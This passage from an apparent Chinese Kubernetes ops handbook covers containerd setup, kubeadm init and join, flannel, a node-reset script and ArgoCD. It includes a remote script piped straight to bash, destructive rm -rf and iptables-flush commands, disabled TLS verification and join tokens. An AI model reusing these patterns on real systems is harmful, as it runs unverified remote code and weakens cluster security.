<li>\u5bb9\u5668\u8fd0\u884c\u65f6</li> </ul> <p>\u9ed8\u8ba4\u914d\u7f6e</p> <pre><code># \u66ff\u6362 ctr \u8fd0\u884c\u65f6\nmkdir -p /etc/containerd\ncontainerd config default &gt; /etc/containerd/config.toml-default\ncp /etc/containerd/config.toml-default /etc/containerd/config.toml\n\n#\n# Example \n#   https://books.8ops.top/attachment/kubernetes/containerd-config.toml\n#\n\nsed -i 's#sandbox_image.*$#sandbox_image = \"hub.8ops.top/google_containers/pause:3.6\"#' /etc/containerd/config.toml  \nsed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml \ngrep -P 'sandbox_image|SystemdCgroup' /etc/containerd/config.toml  \nsystemctl restart containerd\nsystemctl status containerd\n</code></pre> <p>\u53d7\u4fe1\u79c1\u6709 CA</p> <pre><code>#\n# Example\n#   https://books.8ops.top/attachment/kubernetes/containerd-config.toml\n#\n\n# \u65b9\u5f0f\u4e00\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53d7\u4fe1\u79c1\u6709CA\napt install -y ca-certificates\ncp CERTIFICATE.crt /usr/local/share/ca-certificates/CERTIFICATE.crt\nupdate-ca-certificates\n\n# \u65b9\u5f0f\u4e8c\uff0c\u7f16\u8f91/etc/containerd/config.toml\n# \u652f\u6301\u79c1\u6709Harbor\uff0c\u5f53\u4f7f\u7528\u79c1\u6709CA\u7b7e\u540d\u65f6\u9700\u8981\u7cfb\u7edf\u53d7\u4fe1\u6839CA\u6216\u8005\u91c7\u7528\u975e\u5b89\u5168\u6a21\u5f0f\u89c1\u7f16\u8f91config.toml\n\u2026\u2026\n\n[plugins] # relative\n    \u2026\u2026\n  [plugins.\"io.containerd.grpc.v1.cri\"] # relative\n        \u2026\u2026\n        # sandbox_image\n    sandbox_image = \"hub.8ops.top/google_containers/pause:3.6\"\n        \u2026\u2026\n      [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes]\n        [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc]\n          [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc.options]\n            # systemd\n            SystemdCgroup = true\n        \u2026\u2026\n    # insecure\n    [plugins.\"io.containerd.grpc.v1.cri\".registry]\n      [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors] # relative\n        [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"hub.8ops.top\"]\n          endpoint = [\"https://hub.8ops.top\"]\n      [plugins.\"io.containerd.grpc.v1.cri\".registry.configs] # relative\n        [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"hub.8ops.top\".tls]\n          insecure_skip_verify = true  \n\n# QuickStart Usage\nsed -i '/.registry.mirrors/a \\        [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"hub.8ops.top\"]\\n          endpoint = [\"https://hub.8ops.top\"]' /etc/containerd/config.toml\nsed -i '/.registry.configs/a \\         [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"hub.8ops.top\".tls]\\n          insecure_skip_verify = true ' /etc/containerd/config.toml\nsystemctl restart containerd\ncrictl pull hub.8ops.top/google_containers/pause:3.6\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#32-kubeadm","title":"3.2 \u521d\u59cb kubeadm \u73af\u5883","text":"<p>Reference</p> <ul> <li> <p>InitConfiguration</p> </li> <li> <p>ClusterConfiguration</p> </li> <li>KubeProxyConfiguration</li> <li>KubeletConfiguration</li> </ul> <p>\u5728\u6240\u6709\u8282\u70b9\u9700\u8981\u6267\u884c\u7684\u64cd\u4f5c</p> <p>\u5b89\u88c5kubeadm\u5fc5\u8981\u8f6f\u4ef6\u5305</p> <pre><code>KUBERNETES_VERSION=1.23.0-00\napt install -y -q kubeadm=${KUBERNETES_VERSION} kubectl=${KUBERNETES_VERSION} kubelet=${KUBERNETES_VERSION}\n\napt-mark hold kubeadm kubectl kubelet\napt-mark showhold\ndpkg -l | grep kube\n</code></pre> <p>\u5b8c\u5584 crictl \u6267\u884c\u914d\u7f6e</p> <pre><code># deprecated\ncat &gt; /etc/systemd/system/kubelet.service.d/0-containerd.conf &lt;&lt;EOF\n[Service]\nEnvironment=\"KUBELET_EXTRA_ARGS=--container-runtime=remote --runtime-request-timeout=15m --container-runtime-endpoint=unix:///run/containerd/containerd.sock\"\nEOF\n\n# \u7528\u4e8e\u8fd0\u884ccrictl\ncat &gt; /etc/crictl.yaml &lt;&lt;EOF\nruntime-endpoint: unix:///run/containerd/containerd.sock\nimage-endpoint: unix:///run/containerd/containerd.sock\ntimeout: 10\ndebug: false\nEOF\n\nsystemctl restart containerd\ncrictl images\ncrictl ps -a\n\n#\n# \u4e0d\u914d\u7f6e\u6307\u5b9a\u65f6\u4f1a\u9ed8\u8ba4\u4f9d\u6b21\u6309\u987a\u5e8f\u4f7f\u7528\uff1adocker--&gt; containerd --&gt; cri-o\uff0c\u7f3a\u7701\u9ed8\u8ba4\u4f7f\u7528docker\n# \u5e38\u89c1\u8f93\u51fa\u8b66\u544a\u5982\u4e0b\n# WARN[0000] image connect using default endpoints: [unix:///var/run/dockershim.sock unix:///run/containerd/containerd.sock unix:///run/crio/crio.sock]\n#\n# \u82e5\u4e0d\u5b58\u5728\u5bb9\u5668\u8fd0\u884c\u65f6\u5219\u62a5\u9519\u5982\u4e0b\n# FATA[0010] failed to connect: failed to connect: context deadline exceeded\n#\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#33","title":"3.3 \u521d\u59cb\u5316\u96c6\u7fa4","text":"<p>\u9009\u62e9\u5176\u4e2d\u4e00\u53f0 control-plane, master \u8282\u70b9\uff0c\u8fd9\u91cc\u9009\u62e9 <code>10.101.11.240</code></p> <p>\u521d\u59cb\u64cd\u4f5c</p> <pre><code># \u9ed8\u8ba4\u914d\u7f6e\nkubeadm config print init-defaults &gt; kubeadm-init.yaml-default\n\n#\n# Example \n#   https://books.8ops.top/attachment/kubernetes/kubeadm-init.yaml-v1.23.0\n#\n\n# \u9ed8\u8ba4\u955c\u50cf\nkubeadm config images list -v 5\n\n# \u6253\u5370\u955c\u50cf\nkubeadm config images list --config kubeadm-init.yaml -v 5\n\n# \u9884\u53d6\u955c\u50cf\nkubeadm config images pull --config kubeadm-init.yaml -v 5\n</code></pre> <p>\u7f16\u8f91 kubeadm-init.yaml</p> <pre><code>apiVersion: kubeadm.k8s.io/v1beta3\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 10.101.11.240\n  bindPort: 6443\nnodeRegistration:\n  criSocket: /run/containerd/containerd.sock\n  name: K-KUBE-LAB-01\n  taints: null\n  kubeletExtraArgs: null\n---\napiServer:\n  timeoutForControlPlane: 4m0s\napiVersion: kubeadm.k8s.io/v1beta3\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns:\n  imageRepository: hub.8ops.top/google_containers\n  imageTag: 1.8.6\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: hub.8ops.top/google_containers\nkind: ClusterConfiguration\nkubernetesVersion: 1.23.0\ncontrolPlaneEndpoint: 10.101.11.110:6443\nnetworking:\n  dnsDomain: cluster.local\n  podSubnet: 172.20.0.0/16\n  serviceSubnet: 192.168.0.0/16\nscheduler: {}\n---\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\ncgroupDriver: systemd\n---\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p>\u521d\u59cb\u5316\u96c6\u7fa4</p> <pre><code>kubeadm init --config kubeadm-init.yaml --upload-certs -v 5\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p>\u914d\u7f6e\u7f3a\u7701\u65f6 kubeconfig \u6587\u4ef6</p> <pre><code>mkdir -p ~/.kube &amp;&amp; ln -s /etc/kubernetes/admin.conf ~/.kube/config \n</code></pre> <p>\u67e5\u770b\u8282\u70b9</p> <pre><code>kubectl get no\n</code></pre> <p></p> <p>\u4fee\u6539\u5168\u5c40\u914d\u7f6e</p> <p>kubelet \u548c kube-proxy \u9700\u8981\u76f8\u5e94\u91cd\u542f</p> <pre><code># kubeadm\nkubectl -n kube-system edit cm kubeadm-config\n\n# kubelet\n\nkubectl -n kube-system edit cm kubelet-config-1.23\n\u2026\u2026\n        # GC\n    imageGCLowThresholdPercent: 40\n    imageGCHighThresholdPercent: 50\n    # Resource\n    systemReserved:\n      cpu: 500m\n      memory: 500m\n    kubeReserved:\n      cpu: 500m\n      memory: 500m\n    evictionPressureTransitionPeriod: 300s # upgrade\n    nodeStatusReportFrequency: 10s         # upgrade\n    nodeStatusUpdateFrequency: 10s         # upgrade\n    cgroupDriver: systemd\n    maxPods: 200\n    resolvConf: /etc/resolv.conf\nkind: ConfigMap                            # relative\n\u2026\u2026\n\n# kube-proxy \n# \u5f53flannel\u91c7\u7528host-gw\u65f6\uff0c\u9700\u8981\u5f00\u542fipvs\nkubectl -n kube-system edit cm kube-proxy\n\n\u2026\u2026\n    configSyncPeriod: 5s # upgrade\n    mode: \"ipvs\"         # upgrade\n    ipvs:                # relative\n      tcpTimeout: 900s   # upgrade\n      syncPeriod: 5s     # upgrade\n      minSyncPeriod: 5s  # upgrade\n\u2026\u2026\n</code></pre> <p>\u81ea\u4e3ePod's QoS</p> <pre><code># kube-proxy\nkubectl -n kube-system edit daemonset kube-proxy\n\u2026\u2026\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n\u2026\u2026\n\n# coredns\nkubectl -n kube-system edit deployment coredns\n\u2026\u2026\n    resources:\n      requests:\n        cpu: 50m\n        memory: 64Mi\n\u2026\u2026\n\n# kube-flannel-ds\nkubectl -n kube-system edit daemonset kube-flannel-ds\n\u2026\u2026\n    resources:\n      requests:\n        cpu: 50m\n        memory: 64Mi\n\u2026\u2026\n\n# kube-apiserver - [Burstable]\n# kube-controller-manager - [Burstable]\n# kube-scheduler - [Burstable]\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#34-join","title":"3.4 Join \u8282\u70b9","text":"<p>\u83b7\u53d6Join\u4fe1\u606f</p> <p>\u65b9\u5f0f\u4e00\uff0c\u5728\u521d\u59cb\u5b8c\u96c6\u7fa4\u4f1a\u6253\u5370Join\u7684\u547d\u4ee4</p> <p>\u5728\u521d\u59cb\u5316\u96c6\u7fa4\u6210\u529f\u65f6\u8f93\u51fa\u7684\u4fe1\u606f\u4e2d\u6709\u6253\u5370\u51fa\u6765\uff0c\u53c2\u8003\u4e0a\u9762Output\u5185\u5bb9</p> <p>\u65b9\u5f0f\u4e8c\uff0c\u6784\u5efaJoin\u547d\u4ee4</p> <p>\u4e0a\u4f20certs</p> <pre><code># \u4e0a\u4f20 cert\nkubeadm init phase upload-certs --upload-certs\n\n#\n## \u6216\u8005\u83b7\u53d6\u5df2\u7ecf\u4e0a\u4f20\u7684certs\n# openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | \\\n#    openssl rsa -pubin -outform der 2&gt;/dev/null | \\\n#    openssl dgst -sha256 -hex | sed 's/^.* //'\n#\n\n# \u751f\u6210 token\nkubeadm token generate\n\n# \u6253\u5370 join control-plane,master\nkubeadm token create um69xx.qg70e11b92fmsevs --print-join-command -v 5 \\\n  --certificate-key 3c7b6191702471e8ee2f3dea4ce422044b266928c808b6957fb0c81ef2388bed\n\n# \u6253\u5370 join node\nkubeadm token create kvj7wh.buud7djga5j76xil --print-join-command -v 5\n\n# ---\n# \u4e00\u6b65\u5c31\u4f4d\n\n# join control-plane\nkubeadm token create --print-join-command --certificate-key xx\n\n# join node\nkubeadm token create --print-join-command \n</code></pre> <p>\u67e5\u770b token list</p> <pre><code>kubeadm token list\n</code></pre> <p></p> <p>join control-plane,master</p> <pre><code>kubeadm join 10.101.11.110:6443 --token abcdef.0123456789abcdef \\\n --discovery-token-ca-cert-hash sha256:ae1d593bbadecf245c30f4c1cfe9250faa0aaa9e4c27b7f34bcb10142d0dd0c8 \\\n --control-plane --certificate-key 811e33703005a1df116201ae6469d86746274c3579e62b7c924cc4c13a804bca -v 5in the cluster.\n</code></pre> <p>join node</p> <pre><code>kubeadm join 10.101.11.110:6443 --token abcdef.0123456789abcdef \\\n  --discovery-token-ca-cert-hash sha256:ae1d593bbadecf245c30f4c1cfe9250faa0aaa9e4c27b7f34bcb10142d0dd0c8\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#35","title":"3.5 \u90e8\u7f72\u7f51\u7edc","text":"<p>\u6b64\u5916\u9009\u578b<code>flannel</code></p> <p>\u90e8\u7f72</p> <pre><code>#\n# Reference \n#   https://raw.githubusercontent.com/flannel-io/flannel/master/Documentation/kube-flannel.yml\n#\n# Example\n#   https://books.8ops.top/attachment/kubernetes/kube-flannel.yaml-v0.15.1\n#\n\nkubectl apply -f kube-flannel.yaml\n</code></pre> <p>\u7f16\u8f91 kube-flannel.yaml</p> <pre><code>\u2026\u2026\n  net-conf.json: | # relative\n    {\n      \"Network\": \"172.20.0.0/16\",\n      \"Backend\": {\n        \"Type\": \"host-gw\"\n      }\n    }\n\u2026\u2026\n    # \u955c\u50cf\u66ff\u6362\u4e3a\u79c1\u6709\u5730\u5740\n      initContainers:\n      - name: install-cni-plugin\n        image: hub.8ops.top/google_containers/flannel-cni-plugin:v1.0.0\n        \u2026\u2026\n      - name: install-cni\n        image: hub.8ops.top/google_containers/flannel:v0.15.1\n        \u2026\u2026\n      containers:\n      - name: kube-flannel\n        image: hub.8ops.top/google_containers/flannel:v0.15.1\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#36","title":"3.6 \u9a8c\u6536\u96c6\u7fa4","text":"<p>\u67e5\u770bcluster-info</p> <pre><code>kubectl cluster-info\n</code></pre> <p></p> <p>OR</p> <pre><code>kubectl get cs\n</code></pre> <p></p> <p> etcd\u8fd0\u884c\u4fe1\u606f <pre><code>etcdctl member list \\\n    --endpoints=https://10.101.11.240:2379 \\\n    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n    --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status \\\n    --endpoints=https://10.101.11.240:2379,https://10.101.11.114:2379,https://10.101.11.154:2379 \\\n    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n    --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status \\\n    --cluster \\\n    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n    --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre> <p>\u67e5\u770b\u521d\u59cb\u9759\u6001\u5e94\u7528</p> <pre><code>kubectl get all -A\n</code></pre> <p></p> <p>\u67e5\u770b\u8282\u70b9</p> <pre><code>kubectl get no\n</code></pre> <p></p> <p>\u67e5\u770b\u8282\u70b9\u8def\u7531</p> <pre><code>apt install -y ipvsadm\n\nipvsadm -ln\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#_4","title":"\u56db\u3001\u5e38\u89c1\u95ee\u9898","text":"<p>\u83b7\u53d6\u5de5\u5177kubectl</p>"},{"location":"kubernetes/01-cluster-init/#41","title":"4.1 \u8282\u70b9\u672a\u5c31\u4f4d","text":"<p>\u7f3a\u5c11\u96c6\u7fa4\u7f51\u7edc\u6216\u96c6\u7fa4\u7f51\u7edc\u5b58\u5728\u95ee\u9898</p>"},{"location":"kubernetes/01-cluster-init/#42-coredns","title":"4.2 coredns \u672a\u5c31\u4f4d","text":"<p>\u7b2c\u4e00\u79cd\uff0c\u5b89\u88c5\u63d2\u4ef6\u65f6\u673a</p> <pre><code># \u5076\u5c14\u51fa\u73b0 coredns \u4e0d\u5c31\u4f4d\u60c5\u51b5\u662f\u56e0\u4e3a\u52a0 Node \u4e4b\u524d\u88c5\u7f51\u7edc\u63d2\u4ef6 flannel \nkubectl get pod -A -o wide\n\n# \u4ea6\u6216 coredns \u5728 control plane \u8282\u70b9\u4e0a\n# \u91cd\u7f6e\u540e\u91cd\u65b0\u521d\u59cb\u5316\u96c6\u7fa4\uff0c\u5148\u5b89\u88c5 flannel\uff0c\u518d Join \u5176\u4ed6\u8282\u70b9\n# \u53ef\u4ee5\u89e3\u51b3\u6b64\u73b0\u8c61\n</code></pre> <p>\u7b2c\u4e8c\u79cd\uff0c\u6743\u9650\u95ee\u9898\u9700\u8981\u624b\u52a8\u4fee\u590d\uff08 v1.22.0\u540e\u5df2\u7ecf\u4fee\u590d\uff09</p> <pre><code>~ # kubectl edit clusterrole system:coredns\n\u2026\u2026\n# append\n- apiGroups:\n  - discovery.k8s.io\n  resources:\n  - endpointslices\n  verbs:\n  - list\n  - watch\n</code></pre> <p>\u5220\u9664\u539f\u6709 pod/coredns-xx</p> <pre><code>kubectl -n kube-system delete pod/coredns-55866688ff-hwp4m pod/coredns-55866688ff-tn8sj\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#43-controller-manager-scheduler","title":"4.3 controller-manager \u548cscheduler \u672a\u5065\u5eb7\u5c31\u4f4d","text":"<p>\u4fee\u590d\u6b64\u95ee\u9898</p> <pre><code>sed -i '/--port/d' /etc/kubernetes/manifests/kube-controller-manager.yaml\nsed -i '/--port/d' /etc/kubernetes/manifests/kube-scheduler.yaml\n</code></pre> <p>\u5373\u65f6\u81ea\u52a8\u751f\u6548</p> <p></p>"},{"location":"kubernetes/01-cluster-init/#44-dns","title":"4.4 dns \u5bfb\u5740\u5931\u8d25","text":"<pre><code>#\n# \u65b9\u5f0f\u4e00\uff0c\u542f\u52a8busybox\n## \u5efa\u8bae\u4f7f\u75281.28.0\uff0c\u65b0\u7248\u672c\u4f1a\u6709nslookup\u7684BUG\n# \nkubectl run busybox --image hub.8ops.top/third/busybox:1.28.0 --command -- sh -c \"while true;do sleep 60;date;done\"\n\n# kubectl apply -f https://books.8ops.top/attachment/kubernetes/app/51-busybox-daemonset.yaml\nkubectl run nginx --image hub.8ops.top/third/nginx:1.21.3\n\n#\n# \u65b9\u5f0f\u4e8c\uff0c\u542f\u52a8jessie-dnsutils:1.3\n## \u81ea\u5e26dns\u68c0\u6d4b\u5de5\u5177\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#45","title":"4.5 \u5bb9\u5668\u8fd0\u884c\u5931\u8d25","text":"<pre><code># \n# Case by case \u770b\u62a5\u4ec0\u4e48\u9519\n# e.g. kubectl apply -f https://books.8ops.top/attachment/kubernetes/app/51-nginx-deployment.yaml\n#\n\n# \n# Example\n#   https://books.8ops.top/attachment/kubernetes/app/50-busybox-daemonset.yaml\n#   https://books.8ops.top/attachment/kubernetes/app/51-nginx-deployment.yaml\n#   https://books.8ops.top/attachment/kubernetes/app/52-echoserver.yaml\n#\n</code></pre> <p>\u81f3\u6b64 kubernetes cluster \u642d\u5efa\u5b8c\u6210\u4e86\u3002</p>"},{"location":"kubernetes/02-cluster-reset/","title":"Quick Reset","text":"<p>\u5728\u642d\u5efakubernetes cluster\u65f6\u5f88\u591a\u65f6\u5019\u9700\u8981\u5feb\u901f\u91cd\u7f6e\u4e00\u4e2a\u8282\u70b9\uff0c\u907f\u514d\u7b2c\u4e8c\u6b21\u642d\u5efa\u6216\u91cd\u65b0\u5c06\u8282\u70b9\u52a0\u5165\u96c6\u7fa4\u65f6\u88ab\u5e72\u6270\uff0c\u6545\u6574\u7406\u4e86\u4e00\u952e\u91cd\u7f6e\u64cd\u4f5c\u65b9\u4fbf\u5feb\u901f\u590d\u7528\u3002</p> <p>\u5df2\u7ecf\u5c01\u88c5\u4e00\u952e\u811a\u672c\uff0c\u4e0b\u8f7d\u76f4\u63a5\u6267\u884c</p>"},{"location":"kubernetes/02-cluster-reset/#_1","title":"\u4e00\u3001\u5feb\u901f\u5e94\u7528","text":"<p>\u6e05\u9664\u5185\u5bb9\u5305\u62ec</p> <ol> <li>reset kubernetes cluster </li> <li>release network</li> <li>release fireward</li> <li>stop service</li> <li>remove package</li> <li>release directory or files</li> </ol> <pre><code>curl -s https://books.8ops.top/attachment/kubernetes/bin/99-reset.sh | bash\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p>"},{"location":"kubernetes/02-cluster-reset/#_2","title":"\u4e8c\u3001\u903b\u8f91\u89e3\u6790","text":"<p>\u8bbe\u8ba1\u539f\u7406</p> <p>\u5728kubernetes cluster\u642d\u5efa\u8fc7\u7a0b\u4e2d\u4f1a\u4ea7\u751f\u5f88\u591a\u7684\u865a\u62df\u7f51\u5361\uff0c\u5b89\u88c5\u76f8\u5e94\u7684\u8f6f\u4ef6\u5305\u5728ubuntu\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u3002</p> <p>\u4e3a\u8fbe\u5230\u5f7b\u5e95\u91cd\u7f6e\u4e00\u4e2a\u8282\u70b9\uff0c\u8ba9\u4ed6\u56de\u5230\u6700\u521d\u7684\u65e0\u6c61\u67d3\u64cd\u4f5c\u7cfb\u7edf\u72b6\u6001\u3002</p> <p>\u5145\u5206\u5e94\u7528\u4e86ubuntu\u64cd\u4f5c\u7cfb\u7edf\u7279\u6027\u5bf9\u7f51\u7edc\u6a21\u5757\u3001\u8f6f\u4ef6\u5305\u6a21\u5757\u53ca\u670d\u52a1\u6a21\u5757\u7684\u7ba1\u7406\u73af\u8282\u3002</p> <p>\u811a\u672c\u5185\u5bb9</p> <pre><code>#!/bin/bash\n\n# set -ex\n\n# 1, reset kubernetes cluster \nprintf '\\n\\n1, reset kubernetes cluster\\n'\ncommand -v kubeadm &amp;&amp; kubeadm reset --force --cri-socket /run/containerd/containerd.sock\n# kubeadm reset --force --cri-socket /var/run/dockershim.sock\n\n# 2, release network\nprintf '\\n\\n2, release network\\n'\nip link set dev flannel.1 down || /bin/true\nip link set dev cni0 down || /bin/true\nip link set dev kube-ipvs0 down || /bin/true\nip link delete flannel.1 || /bin/true\nip link delete cni0 || /bin/true\nip link delete kube-ipvs0 || /bin/true\n\n# show network device\nprintf '\\n\\n ---- show network device ---- \\n'\n# ip link show\nip address show\nprintf '  \\n ----------------------------- \\n\\n'\n\n# 3, release fireward\nprintf '\\n\\n3, release fireward\\n'\niptables -F &amp;&amp; iptables -X &amp;&amp; ipvsadm -C\niptables -t nat -F &amp;&amp; iptables -t nat -X\niptables -t mangle -F &amp;&amp; iptables -t mangle -X\n\n# show iptables\nprintf '\\n\\n ---- show iptables ---- \\n'\niptables -t filter -vnxL\niptables -t filter -vnxL\nipvsadm -ln\nprintf '  \\n ----------------------- \\n\\n'\n\n# crictl images | awk 'NR&gt;1{printf(\"crictl rmi %s\\n\",$3)}' |sh\n\n# 4, stop services\nprintf '\\n\\n4, stop services\\n'\nsystemctl stop kubelet\nsystemctl stop docker\nsystemctl stop containerd\n\n# 5, remove packages\nprintf '\\n\\n6, remove packages\\n'\n\n# unhold packages\nprintf '\\n\\n5, unhold packages\\n'\napt-mark unhold kubeadm\napt-mark unhold kubectl\napt-mark unhold kubelet\napt-mark unhold docker\napt-mark unhold containerd\n\n# apt-mark showhold\nprintf '\\n\\n ---- apt-mark showhold ---- \\n'\napt-mark showhold\nprintf '  \\n --------------------------- \\n\\n'\n\n# remove held packages\napt remove -y --purge --allow-change-held-packages kubeadm  || /bin/true\napt remove -y --purge --allow-change-held-packages kubelet || /bin/true\napt remove -y --purge --allow-change-held-packages kubectl  || /bin/true\napt remove -y --purge --allow-change-held-packages kubernetes-cni || /bin/true\napt remove -y --purge --allow-change-held-packages containerd  || /bin/true\napt remove -y --purge --allow-change-held-packages containerd.io  || /bin/true # deprecated\napt remove -y --purge --allow-change-held-packages docker-ce  || /bin/true.    # deprecated\napt remove -y --purge --allow-change-held-packages cri-o  || /bin/true\napt remove -y --purge --allow-change-held-packages cri-o-runc || /bin/true\n\n# release auto-remove\napt auto-remove -y\n\n# show release packages detail\nprintf '\\n\\n ---- show release packages detail ---- \\n'\ndpkg -l | awk '$2~/kube|cni|cri|containerd|docker/'\nprintf '  \\n -------------------------------------- \\n\\n'\n\n# 6, release directory or files\nprintf '\\n\\n7, release directory or files\\n'\nmv /data1/lib{,-$(date +%Y%m%d)}\nrm -rf /etc/systemd/system/kubelet.service.d /var/lib/kubelet\nrm -rf /var/lib/docker /etc/docker /run/docker /run/docker.sock /run/dockershim.sock\nrm -rf /opt/containerd /etc/containerd /run/containerd /var/lib/containerd\nrm -rf /etc/crio/ /etc/crictl.yaml\nrm -rf /opt/cni /etc/cni /var/lib/cni /run/flannel\nrm -rf ~/.kube /etc/kubernetes\nrm -rf ~/.cache/helm ~/.config/helm\n\n\nprintf '\\n\\n ---- Completed ---- \\n\\n'\nexit 0\n</code></pre>"},{"location":"kubernetes/04-argocd/","title":"ArgoCD","text":""},{"location":"kubernetes/04-argocd/#_1","title":"\u4e00\u3001\u5b89\u88c5","text":"<pre><code>helm repo add argoproj https://argoproj.github.io/argo-helm\nhelm repo update argoproj\nhelm search repo argo-cd\nhelm show values argoproj/argo-cd --version 5.13.8 &gt; argocd-configs.yaml-5.13.8-default\n\n# Example\n#   https://books.8ops.top/attachment/argoproj/helm/argocd-configs.yaml-5.13.8\n#   https://books.8ops.top/attachment/argoproj/helm/argocd-configs.yaml-5.4.2\n# \n\nhelm upgrade --install argo-cd argoproj/argo-cd \\\n    -n kube-server \\\n    -f argocd-configs.yaml-5.13.8 \\\n    --version 5.13.8\n\nhelm -n kube-server uninstall argo-cd\n\nkubectl -n kube-server get secret argocd-initial-admin-secret \\\n    -o jsonpath=\"{.data.password}\" | base64 -D; echo \n</code></pre>"},{"location":"kubernetes/04-argocd/#_2","title":"\u4e8c\u3001\u4f7f\u7528","text":"<p>\u53ef\u4ee5\u901a\u8fc7 <code>UI</code> \u754c\u9762\u5411\u5bfc\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>argocd</code> \u547d\u4ee4\u64cd\u4f5c</p> <pre><code>curl -sSL -o ~/bin/argocd https://github.com/argoproj/argo-cd/releases/download/v2.5.2/argocd-linux-amd64\nchmod +x ~/bin/argocd\n</code></pre>"},{"location":"kubernetes/04-argocd/#21","title":"2.1 \u591a\u96c6\u7fa4","text":"<pre><code># \u67e5\u770b kubeconfig\nkubectl config get-contexts\n\n# \u767b\u5f55 argo-cd\nargocd login argo-cd.8ops.top --username=admin --password=xx --grpc-web\nargocd context --grpc-web\n\n# \u6dfb\u52a0 kubernetes cluster\nargocd cluster add kubeconfig-guest-name \\\n    --kubeconfig ~/.kube/config \\\n    --name argocd-cluster-name --grpc-web\n\n# \u975e\u5b89\u5168\u6a21\u5f0f - token\u8ba4\u8bc1\nargocd cluster add kube-context-name --name argocd-context-name --grpc-web\nargocd cluster list --grpc-web\n</code></pre> <p>argocd\u6dfb\u52a0\u5916\u90e8kubernetes cluster\u6b65\u9aa4</p> <pre><code># \u7b2c\u4e00\u6b65\uff0c\u901a\u8fc7ingress-nginx\u66b4\u9732\u6d41\u91cf\nkubectl apply -f kube-apiserver-ingress.yaml\n\n# \u7b2c\u4e8c\u6b65\uff0c\u5728kubeconfig\u6dfb\u52a0context\n\n# \u7b2c\u4e09\u6b65\uff0c\u767b\u5f55argocd\nargocd login argocd.8ops.top\n\n# \u7b2c\u56db\u6b65\uff0c\u6dfb\u52a0cluster\nargocd cluster add kube-context-name --name argocd-context-name --grpc-web\n# \u6dfb\u52a0\u5b8c\u6210\u540e\u4f1a\u5728\u5bf9\u5e94\u7684 kubernetes cluster \u521b\u5efa ServiceAccount/argocd-manager\n# kubectl -n kube-system get ServiceAccount/argocd-manager ClusterRole/argocd-manager-role ClusterRoleBinding/argocd-manager-role-binding\n\n# \u7b2c\u4e94\u6b65\uff0c\u67e5\u770bcluster\nargocd cluster list --grpc-web\n</code></pre> <p>kube-apiserver-ingress.yaml</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/backend-protocol: HTTPS\n    service.alpha.kubernetes.io/app-protocols: '{\"https\":\"HTTPS\"}'\n    nginx.ingress.kubernetes.io/whitelist-source-range: 10.1.1.0/28\n  name: kube-apiserver\n  namespace: default\nspec:\n  ingressClassName: external\n  rules:\n  - host: kube-apiserver.8ops.top\n    http:\n      paths:\n      - backend:\n          service:\n            name: kubernetes\n            port:\n              number: 443\n        path: /\n        pathType: Prefix\n  tls:\n  - hosts:\n    - kube-apiserver.8ops.top\n    secretName: tls-8ops.top\n</code></pre> <p>kubeconfig</p> <pre><code>apiVersion: v1\nclusters:\n- cluster:\n    insecure-skip-tls-verify: true\n    server: https://kube-apiserver.8ops.top\n  name: kube-external-insecure\ncontexts:\n- context:\n    cluster: kube-external-insecure\n    user: kube-external-user\n  name: kube-external-insecure  \ncurrent-context: kube-external-insecure \nkind: Config\npreferences:\n  colors: true\nusers:\n- name: kube-external-user\n  user:\n    token: &lt;data&gt;  \n</code></pre> <p>view</p> <pre><code>SERVER                          NAME                   VERSION STATUS     MESSAGE PROJECT\nhttps://kube-apiserver.8ops.top kube-external-insecure 1.23    Successful\nhttps://kubernetes.default.svc  in-cluster             1.25    Successful\n</code></pre>"},{"location":"kubernetes/04-argocd/#22-accounts","title":"2.2 accounts","text":"<p>Reference</p> <ul> <li> <p>\u7528\u6237\u7ba1\u7406</p> </li> <li> <p>RBAC\u63a7\u5236</p> </li> </ul> <pre><code># get account admin's pass\n~ $ kubectl -n kube-server get secret argocd-initial-admin-secret -o jsonpath=\"{.data.password}\" | base64 --decode\n\n# add account jesse\n~ $ 